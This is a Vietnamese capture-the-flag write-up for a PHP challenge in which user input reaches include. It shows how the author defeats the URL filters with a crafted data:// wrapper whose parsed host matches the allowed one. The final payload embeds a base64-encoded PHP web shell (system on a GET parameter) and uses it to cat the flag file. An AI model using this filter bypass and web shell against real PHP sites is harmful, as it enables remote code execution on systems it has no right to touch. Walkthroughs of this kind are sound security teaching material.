Đầu tiên vào trang web sẽ cho source như sau:

```php
 <?php
  ini_set('open_basedir', '.');
  if(isset($_GET['url'])){
    $url = $_GET['url']; //.".txt";       I think i should make this challenge eaiser :)))
    if(!filter_var($url, FILTER_VALIDATE_URL)) exit("invalid url");
    if(!preg_match("/http:\/\/nhienit.kma:2010\//",$url)) exit("invalid server");
    if(preg_match("/@|#|\(|\)|\\$|`|'|\"|_|{|}|\?/",$url)) exit("you are not orange");
    if((parse_url($url)['host'] !== "nhienit.kma") || (parse_url($url)['port'] !== 2010)) exit("invalid host or port");
    if(parse_url($url)['user'] || parse_url($url)['pass']) exit("you are not orange");
    include $url;
  }
  else {
    highlight_file(__FILE__); 
    exit();
  }
  // Hint: Google is your friend!!!! XD
?> 
```

Rồi phân tích `source`, thì trông source có vẻ filter khá là nhiều. Tìm cách để có thể lấy được flag nào. Nhìn thấy dòng include $url có vẻ là chúng ta cần đọc file qua include.

Vậy làm cách nào để có thể qua được cả đống filter thế kia. Đầu tiên mình nghĩ đến việc bypass `parse_url` vì hôm trước có làm một bài như vậy. Tìm trên mạng, tìm thấy các cách như dử dụng `//` hay là `@`, `#` các thứ nhưng chốt lại là chả cái nào qua được cái ```if(preg_match("/@|#|\(|\)|\\$|`|'|\"|_|{|}|\?/",$url)) exit("you are not orange");```.

Đến đây mình khá là bế tắc. Rồi suy nghĩ là tại sao mình không dùng `wraper php` nhỉ. Và rồi mình test thử một payload đơn giản là: `?url=data://text/plain;base64` và nó qua được filter_var thật.

![image](https://user-images.githubusercontent.com/96786536/157479071-01934455-36be-4143-86b9-0ac81d5ffbac.png)

Ok bypass tiếp cái thứ hai thôi. Để bypass qua cái thứ hai mình đã sử dụng payload: ```?url=data://http://nhienit.kma:2010/plain;base64```

![image](https://user-images.githubusercontent.com/96786536/157479904-1ee50f23-09d6-400f-b3c4-bb7b1afb6d7c.png)

Ok nhưng nó vẫn báo là `invalid host or port`. Rồi để xem nó `parse_url` trả về cái gì sau kho mình up payload nên thì mình đã chạy trên local và được:

![image](https://user-images.githubusercontent.com/96786536/157480691-555e1e20-706b-4c72-9917-3176f2db87f0.png)

Có vẻ là hàm parse_url trả về schema là `data` và host lại là `http`. Vậy là ta chỉ cần thay chỗ http thành `nhienit.kma:2010` là được.

![image](https://user-images.githubusercontent.com/96786536/157481397-0925cb91-a85e-4462-bfd4-02ed1e3c8919.png)

Thêm `http://nhienit.kma:2010` vào phần path là đã thành công bypass qua tất cả payload rồi.

Đây là payload cuối cùng để có thể `RCE`:

Payload: `?url=data://nhienit.kma:2010/http://nhienit.kma:2010/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`.

`PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==` là base64 encode của `<?php system($_GET['c']); ?>`.

Ok thành công up shell. Lục lọi tìm flag thôi(vì flag nằm linh tinh ở đâu đó).

Cuối cùng cũng thấy:

![image](https://user-images.githubusercontent.com/96786536/157483670-cdcd3173-57f4-4c01-8ea8-356e9f4b272a.png)

Payload:
```?url=data://nhienit.kma:2010/http://nhienit.kma:2010/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=cat ../../../flag```

Cảm ơn mọi người đã đọc. Bye!!!
